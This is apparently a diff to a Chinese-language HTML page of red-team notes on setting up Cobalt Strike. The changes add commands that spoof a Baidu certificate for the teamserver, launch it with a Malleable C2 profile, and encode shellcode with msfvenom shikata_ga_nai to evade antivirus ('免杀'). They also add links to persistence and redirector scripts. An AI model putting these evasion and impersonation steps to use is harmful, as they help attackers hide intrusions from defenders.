@@ -153,6 +153,8 @@
                 
                     <li><a class="toctree-l4" href="#c2profile">学习C2profile编写</a></li>
                 
+                    <li><a class="toctree-l4" href="#shellcode">shellcode 免杀</a></li>
+                
                     <li><a class="toctree-l4" href="#aggressor">aggressor 脚本收集</a></li>
                 
                     <li><a class="toctree-l4" href="#_2">引用</a></li>
@@ -234,27 +236,41 @@
 <li>删除历史遗留cobaltstrike.store</li>
 </ol>
 <p>如下:</p>
-<pre><code class="shell">keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname &quot;CN=baidu.com, OU=service operation department, O='BeiJing Baidu Netcom Science Technology Co. Ltd', L=beijing, S=beijing, C=CN&quot;
+<pre><code class="shell"># 获取证书信息
+openssl s_client -connect www.baidu.com:443 -showcerts
+# 把我们teamserver伪装下
+keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname &quot;CN=baidu.com, OU=service operation department, O='BeiJing Baidu Netcom Science Technology Co. Ltd', L=beijing, S=beijing, C=CN&quot;
 </code></pre>
 
 <h2 id="_1">启动</h2>
 <p>cobalt strike 可以加载 C2 profile . 一个非常棒的功能，可以帮我们伪装流量、SSL加密通讯,值得一用！</p>
 <pre><code class="shell">cd /opt/cs/
 git clone https://github.com/rsmudge/Malleable-C2-Profiles
-# 请确保前面证书生产没有问题
+# 请确保前面证书生成没有问题
+# 用法: ./teamserver [external IP] [password] [/path/to/my.profile]
+
 ./teamserver 本机IP 连接密码 Malleable-C2-Profiles/APT/putter.profile
 # 记一下SSL cert SHA,在使用cobaltstrike连接时请确保一致
-# 请确保每个profile符合自己的方式，有的profile有坑
+# 每个teamserver只能加载一个C2 Profiles,如下需要多个 请启动多个teamserver
 </code></pre>
 
 <h2 id="c2profile">学习C2profile编写</h2>
 <ol>
-<li>注意关键字 <em>jitter</em> 的使用!</li>
+<li>注意关键字 <em>jitter</em> 的使用!
+2.</li>
 </ol>
+<h2 id="shellcode">shellcode 免杀</h2>
+<pre><code>cat payloadx86.bin |msfvenom - -a x86 --platform win -e x86/shikata_ga_nai -i 3 -f csharp
+</code></pre>
+
 <h2 id="aggressor">aggressor 脚本收集</h2>
 <ul>
 <li><a href="https://github.com/ZonkSec/persistence-aggressor-script">persistence</a></li>
 <li><a href="https://github.com/Und3rf10w/Aggressor-scripts">Aggressor scripts</a></li>
+<li><a href="https://github.com/bluscreenofjeff/AggressorScripts">Aggressor scripts for use with Cobalt Strike 3.0+</a></li>
+<li><a href="https://github.com/Tom4t0/cobalt-strike-persistence">cobalt strike 自启动脚本 RegKeyRun Bitsadmin SchTasks WMI</a></li>
+<li><a href="https://github.com/rsmudge/ElevateKit">ElevateKit</a></li>
+<li><a href="https://github.com/rvrsh3ll/BeaconSMS/">Set Cobalt Strike Beacons to SMS you upon arrival.</a></li>
 </ul>
 <h2 id="_2">引用</h2>
 <ul>
@@ -266,6 +282,9 @@ git clone https://github.com/rsmudge/Malleable-C2-Profiles
 <li><a href="https://www.sixdub.net/?p=623">Remote Weaponization of WSUS MITM</a></li>
 <li><a href="https://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes/">高级微信战术-课程和笔记</a></li>
 <li><a href="https://blog.cobaltstrike.com/2015/10/21/migrating-your-infrastructure/">迁移基础架构</a></li>
+<li><a href="https://github.com/taherio/redi">用于设置CobaltStrike重定向器的自动脚本(nginx反向代理，letsencrypt)</a></li>
+<li><a href="https://github.com/oldb00t/BeaconTools">BeaconTools</a></li>
+<li><a href="http://threat.tevora.com/dissecting-veil-evasion-powershell-payloads-and-converting-to-a-bind-shell/">Dissecting Veil-Evasion Powershell Payloads and Converting to a Bind Shell</a></li>
 </ul>
               
             </div>
